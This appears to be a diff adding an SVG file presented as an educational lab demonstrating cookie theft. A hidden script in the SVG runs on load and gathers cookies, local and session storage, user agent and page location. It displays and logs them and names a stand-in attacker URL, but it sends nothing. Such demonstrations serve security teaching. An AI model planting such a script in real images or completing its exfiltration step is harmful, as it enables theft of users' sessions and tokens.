@@ -1,0 +1,96 @@
+<!-- 
+  EDUCATIONAL SVG SECURITY LAB - COOKIE THEFT DEMONSTRATION
+  ⚠️ WARNING: This is a synthetic educational example only.
+  Do not use against real systems without authorization.
+  
+  This file demonstrates how SVG files can access browser cookies
+  and other sensitive data, which is a common data exfiltration technique.
+-->
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300" viewBox="0 0 400 300">
+  <!-- Visual elements to make the SVG appear legitimate -->
+  <rect width="400" height="300" fill="#fff5ee"/>
+  <circle cx="200" cy="150" r="80" fill="#ff6347" stroke="#dc143c" stroke-width="3"/>
+  <text x="200" y="160" text-anchor="middle" font-family="Arial, sans-serif" font-size="20" fill="white" font-weight="bold">
+    COOKIE DEMO
+  </text>
+  <text x="200" y="180" text-anchor="middle" font-family="Arial, sans-serif" font-size="12" fill="#333">
+    Data Exfiltration Example
+  </text>
+  
+  <!-- EDUCATIONAL DEMONSTRATION: This shows how malicious SVG files can steal data -->
+  <foreignObject width="0" height="0">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <script>
+        // SYNTHETIC PAYLOAD - FOR EDUCATIONAL PURPOSES ONLY
+        // This demonstrates how SVG files can access sensitive browser data
+        
+        console.log('[EDUCATIONAL DEMO] Cookie theft simulation started');
+        
+        // Simulate data collection (harmless for educational purposes)
+        var educationalData = {
+          timestamp: new Date().toISOString(),
+          demoType: 'Cookie Theft Simulation',
+          cookies: document.cookie || 'No cookies found',
+          localStorage: (function() {
+            var items = [];
+            for (var i = 0; i < localStorage.length; i++) {
+              var key = localStorage.key(i);
+              items.push(key + '=' + localStorage.getItem(key));
+            }
+            return items.length > 0 ? items.join('; ') : 'No localStorage data';
+          })(),
+          sessionStorage: (function() {
+            var items = [];
+            for (var i = 0; i < sessionStorage.length; i++) {
+              var key = sessionStorage.key(i);
+              items.push(key + '=' + sessionStorage.getItem(key));
+            }
+            return items.length > 0 ? items.join('; ') : 'No sessionStorage data';
+          })(),
+          userAgent: navigator.userAgent,
+          location: window.location.href,
+          referrer: document.referrer || 'No referrer'
+        };
+        
+        console.log('[EDUCATIONAL DEMO] Collected data (synthetic):', educationalData);
+        
+        // Display educational message instead of actual data theft
+        var demoDiv = document.createElement('div');
+        demoDiv.style.cssText = 'position:fixed;top:10px;right:10px;background:#ff8c00;color:white;padding:15px;border-radius:5px;z-index:9999;font-family:Arial;font-size:12px;max-width:350px;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
+        demoDiv.innerHTML = `
+          <strong>🍪 EDUCATIONAL DEMO - Cookie Theft</strong><br><br>
+          <strong>Data that could be stolen:</strong><br>
+          • Cookies: ${educationalData.cookies ? 'Present' : 'None'}<br>
+          • Local Storage: ${educationalData.localStorage !== 'No localStorage data' ? 'Present' : 'None'}<br>
+          • Session Storage: ${educationalData.sessionStorage !== 'No sessionStorage data' ? 'Present' : 'None'}<br>
+          • User Agent: ${educationalData.userAgent.substring(0, 50)}...<br><br>
+          <small>⚠️ In a real attack, this data would be sent to an attacker's server.</small>
+        `;
+        document.body.appendChild(demoDiv);
+        
+        // Simulate "sending" data (but don't actually send anything)
+        console.log('[EDUCATIONAL DEMO] Simulating data exfiltration...');
+        console.log('[EDUCATIONAL DEMO] In a real attack, this data would be sent to: http://attacker.com/steal');
+        console.log('[EDUCATIONAL DEMO] Educational demo complete - no actual data was transmitted');
+        
+        // Remove the demo message after 8 seconds
+        setTimeout(function() {
+          if (demoDiv.parentNode) {
+            demoDiv.parentNode.removeChild(demoDiv);
+          }
+        }, 8000);
+        
+        // EDUCATIONAL NOTE: In a real attack, this script would:
+        // - Collect all available cookies
+        // - Access localStorage and sessionStorage
+        // - Send data to attacker's server via:
+        //   * XMLHttpRequest
+        //   * fetch() API
+        //   * Image requests
+        //   * Beacon API
+        // - Potentially steal authentication tokens
+        // - Access sensitive user data
+      </script>
+    </div>
+  </foreignObject>
+</svg> 
